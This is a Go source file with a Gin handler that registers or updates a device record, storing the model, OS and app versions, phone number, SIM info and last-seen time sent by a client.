package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
)

func RegisterDevice(c *gin.Context) {
	var req struct {
		DeviceID    string `json:"device_id"`
		DeviceName  string `json:"device_name"`
		Model       string `json:"model"`
		OsVersion   string `json:"os_version"`
		AppVersion  string `json:"app_version"`
		PhoneNumber string `json:"phone_number"`
		SimInfo     string `json:"sim_info"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var existing models.Device
	result := database.DB.Where("device_id = ?", req.DeviceID).First(&existing)
	if result.Error == nil {
		if req.DeviceName != "" { existing.DeviceName = req.DeviceName }
		if req.Model != "" { existing.Model = req.Model }
		if req.OsVersion != "" { existing.OsVersion = req.OsVersion }
		if req.AppVersion != "" { existing.AppVersion = req.AppVersion }
		if req.PhoneNumber != "" { existing.PhoneNumber = req.PhoneNumber }
		if req.SimInfo != "" && req.SimInfo != "[]" { existing.SimInfo = req.SimInfo }
		existing.LastSeen = time.Now()
		existing.InternetOn = true
		database.DB.Save(&existing)
		c.JSON(http.StatusOK, gin.H{"message": "Device updated", "id": existing.ID})
		return
	}
	device := models.Device{
		DeviceID:    req.DeviceID,
		DeviceName:  req.DeviceName,
		Model:       req.Model,
		OsVersion:   req.OsVersion,
		AppVersion:  req.AppVersion,
		PhoneNumber: req.PhoneNumber,
		SimInfo:     req.SimInfo,
		LastSeen:    time.Now(),
		InternetOn:  true,
	}
	database.DB.Create(&device)
	c.JSON(http.StatusOK, gin.H{"message": "Device registered", "id": device.ID})
}
